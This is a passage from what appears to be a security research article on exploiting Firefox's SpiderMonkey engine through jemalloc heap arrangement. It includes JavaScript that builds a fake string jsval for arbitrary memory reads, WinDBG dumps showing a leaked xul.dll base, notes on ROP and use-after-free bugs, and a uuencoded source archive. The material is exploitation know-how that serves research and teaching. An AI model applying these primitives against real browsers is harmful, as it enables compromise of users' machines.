+    15f15f60  45464645 ffffff81 47484847 ffffff81
+    15f15f70  45464645 ffffff81 47484847 ffffff81
+    15f15f80  45464645 ffffff81 47484847 ffffff81
+    15f15f90  45464645 ffffff81 47484847 ffffff81
+    15f15fa0  45464645 ffffff81 47484847 ffffff81
+    15f15fb0  45464645 ffffff81 47484847 ffffff81
+    15f15fc0  45464645 ffffff81 47484847 ffffff81
+    15f15fd0  45464645 ffffff81 47484847 ffffff81
+    15f15fe0  45464645 ffffff81 47484847 ffffff81
+    15f15ff0  45464645 ffffff81 47484847 ffffff81
+
+    [ SVGImageElement ]
+    15f16000  69e0cf70 69e0eba0 1652da20 00000000
+    15f16010  0d863c90 00000000 00020008 00000000
+    15f16020  00000000 00000000 15f16000 00000000
+    15f16030  00000007 00000000 00090000 00000000
+    15f16040  69e0d1f4 00000000 00000000 00000000
+    15f16050  00000000 00000000 69e0bd38 00000000
+    15f16060  69f680d4 e5e50000 69f680d4 e5e50000
+    15f16070  69f680d4 e5e50100 00000000 e5e5e5e5
+    15f16080  69e0c9d8 69e0c24c 00000000 00000000
+    15f16090  00000000 00000000 00000000 00000000
+    15f160a0  00000000 e5e5e5e5 00000000 00000000
+    15f160b0  00890001 e5000000 00000000 e5e5e5e5
+    15f160c0  00000000 00000000 e4000001 00000000
+    15f160d0  00000000 e4010101 00000000 00000000
+    15f160e0  e4000201 00000000 00000000 e4010301
+    15f160f0  06000106 00000001 00000000 e5e50000
+
+    [ Uint32Array contents ]
+    15f16100  51575751 51575751 51575751 51575751
+    15f16110  51575751 51575751 51575751 51575751
+    15f16120  51575751 51575751 51575751 51575751
+    15f16130  51575751 51575751 51575751 51575751
+    ...
+
+We have managed to create the arrangement we require; we have one
+ArrayObject (with its metadata and jsval contents), followed by an
+SVGImageElement object, followed by the contents of a Uint32Array. If we
+look at some other runs (of our targeted size, 256) we may see that in some
+of them the arrangement has not succeeded. That is the ArrayObject is
+followed by a Uint32Array, which is then followed by an SVGImageElement
+object. This happens sometimes, but it doesn't really affect us. As long
+as there is one run on which our arrangement has worked, our methodology
+can be applied. Below I will explain why some runs with incorrect
+arrangement do not pose a problem; just keep it in mind in case you have
+seen it with shadow and you are wondering.
+
+Next we proceed with triggering our assumed heap overflow bug in an
+SVGImageElement method. This allows us to overwrite data from the
+SVGImageElement object onto the ArrayObject we placed after it (and of
+course the in-between Uint32Array in this case). We then locate the pwned
+ArrayObject as we did in section 5.2, and use it to leak our location in
+memory as we did in 5.3 (see file 'arbitrary-leak.html' in the archive for
+the complete code). We can now focus on transforming our relative leak to
+an arbitrary leak.
+
+Since we know the address of the SVGImageElement object, we can calculate
+the address of the neighboring Uint32Array; it is 0x100 bytes after it. We
+can then create our fake string-type jsval at the beginning of every
+Uint32Array we have sprayed. This fake jsval will point 0x10 bytes after
+the start of the Uint32Array. There we will create a fake non-inline string
+with the arbitrary address we want to leak from. The JavaScript code for
+all these is the following:
+
+    // this is the leaked address of the SVGImageElement object
+    var obj_addr = parseInt(val_hex[0], 16);
+
+    // where we will place our fake non-inline string
+    var fake_jsstring_addr = obj_addr + 0x110;
+
+    // create a fake string-type jsval at the start
+    // of each sprayed Uint32Array object
+    for(var i = 0; i < spray_size; i += 3)
+    {
+        container[i + 1][0] = fake_jsstring_addr;
+        container[i + 1][1] = 0xffffff85;
+    }
+
+    // at obj_addr + 0x110, which corresponds to [64] and [65],
+    // we create a fake non-inline string
+    var read_len = "00000002"; // fake string size
+    write_val_bytes = hex_to_bytes(read_len + "00000049");
+    write_val_double = bytes_to_double(write_val_bytes);
+    container[pwned_index][64] = write_val_double;
+
+    // we use the base of xul.dll as the arbitrary address to
+    // read from, since we know that the first two bytes there
+    // are "MZ" in ASCII
+    var read_addr = xul_base.toString(16);
+    write_val_bytes = hex_to_bytes("00000000" + read_addr);
+    write_val_double = bytes_to_double(write_val_bytes);
+    container[pwned_index][65] = write_val_double;
+
+    // let's read from our fake string, it is at index [62]
+    var leaked = "[*] leaked: " + container[pwned_index][62];
+    log(leaked);
+
+The actual objects in memory after the execution of the above code are:
+
+    0:000> dd 0x15f15f00 l?90
+
+    [ Our corrupted ArrayObject ]
+    15f15f00  00000000 00000666 00000666 00000666
+    15f15f10  45464645 ffffff81 47484847 ffffff81
+    15f15f20  45464645 ffffff81 47484847 ffffff81
+    15f15f30  45464645 ffffff81 47484847 ffffff81
+    15f15f40  45464645 ffffff81 47484847 ffffff81
+    15f15f50  45464645 ffffff81 47484847 ffffff81
+    15f15f60  45464645 ffffff81 47484847 ffffff81
+    15f15f70  45464645 ffffff81 47484847 ffffff81
+    15f15f80  45464645 ffffff81 47484847 ffffff81
+    15f15f90  45464645 ffffff81 47484847 ffffff81
+    15f15fa0  45464645 ffffff81 47484847 ffffff81
+    15f15fb0  45464645 ffffff81 47484847 ffffff81
+    15f15fc0  45464645 ffffff81 47484847 ffffff81
+    15f15fd0  45464645 ffffff81 47484847 ffffff81
+    15f15fe0  45464645 ffffff81 47484847 ffffff81
+    15f15ff0  45464645 ffffff81 47484847 ffffff81
+
+    [ Our SVGImageElement object ]
+    15f16000  69e0cf70 69e0eba0 1652da20 00000000
+    15f16010  0d863c90 00000000 00020008 00000000
+    15f16020  00000000 00000000 15f16000 00000000
+    15f16030  00000007 00000000 00090000 00000000
+    15f16040  69e0d1f4 00000000 00000000 00000000
+    15f16050  00000000 00000000 69e0bd38 00000000
+    15f16060  69f680d4 e5e50000 69f680d4 e5e50000
+    15f16070  69f680d4 e5e50100 00000000 e5e5e5e5
+    15f16080  69e0c9d8 69e0c24c 00000000 00000000
+    15f16090  00000000 00000000 00000000 00000000
+    15f160a0  00000000 e5e5e5e5 00000000 00000000
+    15f160b0  00890001 e5000000 00000000 e5e5e5e5
+    15f160c0  00000000 00000000 e4000001 00000000
+    15f160d0  00000000 e4010101 00000000 00000000
+    15f160e0  e4000201 00000000 00000000 e4010301
+    15f160f0  06000106 00000001 00000000 e5e50000
+
+    [ The contents of our Uint32Array ]
+              [ string jsval  ]
+    15f16100  15f16110 ffffff85 51575751 51575751
+
+              [ fake non-inline string          ]
+                       [ size ] [ addr ]
+    15f16110  00000049 00000002 67c30000 00000000
+
+    15f16120  51575751 51575751 51575751 51575751
+    15f16130  51575751 51575751 51575751 51575751
+
+The output in WinDBG is:
+
+    [*] corrupted array found at index: 25649
+    [*] leaked xul.dll base address: 0x67c30000
+    [*] victim SVGImageElement object is at: 0x15f16000
+    [*] leaked: MZ
+
+Since we used the address of the base of xul.dll (we previously leakd) as
+the arbitrary address to leak from, we get back "MZ" as we expected. At
+this point it should be clear why it doesn't matter if the heap
+arrangement didn't succeed in some jemalloc runs. We can keep trying to
+leak via our fake string jsvals that we placed in the beginning of all
+sprayed Uint32Arrays. We will only get back the expected "MZ" value from a
+jsval on a run that the heap arrangement succeeded. On runs that the
+arrangement didn't work (that is the Uint32Array is before the
+SVGImageElement object), trying to access index 62 (where we expect our
+fake string jsval to be) would simply return a double due to the two
+dwords there being interpreted as an IEEE-754 jsval without a tag. This
+doesn't attempt to do dereference anything, therefore no crash can happen.
+
+When we finally get back the "MZ" value, we can re-use our fake string
+jsval to leak from whatever address we want.
+
+    // now we can re-use the fake string-type jsval
+    // to leak from another location
+    read_addr = "cafebabe"; // crash to demonstrate
+    write_val_bytes = hex_to_bytes("00000000" + read_addr);
+    write_val_double = bytes_to_double(write_val_bytes);
+    container[pwned_index][65] = write_val_double;
+
+    leaked = "[*] leaked: " + container[pwned_index][62];
+    log(leaked);
+
+Our Uint32Array now looks like:
+
+    [ The contents of our Uint32Array ]
+              [ string jsval  ]
+    15f16100  15f16110 ffffff85 51575751 51575751
+
+              [ fake non-inline string          ] 
+                       [ size ] [ addr ]
+    15f16110  00000049 00000002 cafebabe 00000000
+
+    15f16120  51575751 51575751 51575751 51575751
+    15f16130  51575751 51575751 51575751 51575751
+
+Trying to read from address cafebabe leads of course to a crash (just to
+demonstrate):
+
+    0:000> g
+    (858.f68): Access violation - code c0000005 (first chance)
+
+    First chance exceptions are reported before any exception handling.
+    This exception may be expected and handled.
+
+    eax=cafebac0 ebx=00000000 ecx=133bb7f4 edx=00000000 esi=00000002
+    edi=133bb7e0 eip=67df0192 esp=003ad120 ebp=cafebabe
+    iopl=0         nv up ei pl nz na po nc
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b  efl=00010202
+
+    xul!js::ConcatStrings<0>+0x178:
+    67df0192 mov     al,byte ptr [ebp]             ss:002b:cafebabe=??
+
+We finally have a re-usable arbitrary leak primitive and we also know the
+base of xul.dll. We can dynamically search for ROP gadgets and construct
+our ROP chain at exploit runtime in JavaScript.
+
+----[ 5.6 - Use-after-free bugs
+
+Exploiting use-after-free bugs with the presented methodology is a matter
+of reclaiming the jemalloc region left by the freed object with a typed
+array (Uint32Array). Then we use the fake object's methods to overwrite the
+metadata of a neighboring sprayed ArrayObject, and we apply the given
+methodology.
+
+--[ 6 - Conclusion
+
+Greetz and thankz to the Phrack Staff for bugging me to write this and for
+their very helpful review ;) The Immunity team during my dry run for
+Infiltrate also provided insightful comments.
+
+Finally, bro sups to huku, nemo, the CENSUS crew and all the !fapperz.
+
+--[ 7 - References
+
+[INF] OR'LYEH? The Shadow over Firefox -
+      http://web.archive.org/web/20150403070544/http://infiltratecon.com/
+      speakers.html#firefox
+[JSV] JS::Value -
+      https://developer.mozilla.org/en-US/docs/Mozilla/Projects/
+      SpiderMonkey/JSAPI_Reference/JS::Value
+[IFP] IEEE Standard for Floating-Point Arithmetic (IEEE-754) -
+      http://en.wikipedia.org/wiki/IEEE_floating_point
+[JSO] JSObject -
+      https://developer.mozilla.org/en-US/docs/Mozilla/Projects/
+      SpiderMonkey/JSAPI_reference/JSObject
+[P2O] Advanced Exploitation of Mozilla Firefox Use-After-Free
+      Vulnerability (Pwn2Own 2014) -
+      http://www.vupen.com/blog/
+      20140520.Advanced_Exploitation_Firefox_UaF_Pwn2Own_2014.php
+[REN] XSS and Beyond -
+      https://www.owasp.org/images/c/c3/20140617-XSS_and_beyond-Rene.pdf
+[F32] Firefox Release 32.0 -
+      https://www.mozilla.org/en-US/firefox/32.0/releasenotes/
+[JSR] JSAPI User Guide -
+      https://developer.mozilla.org/en-US/docs/Mozilla/Projects/
+      SpiderMonkey/JSAPI_User_Guide
+[PSJ] Pseudomonarchia jemallocum -
+      http://www.phrack.org/issues/68/10.html
+[UNJ] unmask_jemalloc -
+      https://github.com/argp/unmask_jemalloc
+[SHD] shadow -
+      https://github.com/CENSUS/shadow
+[FSJ] Heap Feng Shui in JavaScript -
+      http://www.phreedom.org/research/heap-feng-shui/heap-feng-shui.html
+
+--[ 8 - Source code
+
+begin 664 code.tar.gz
+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
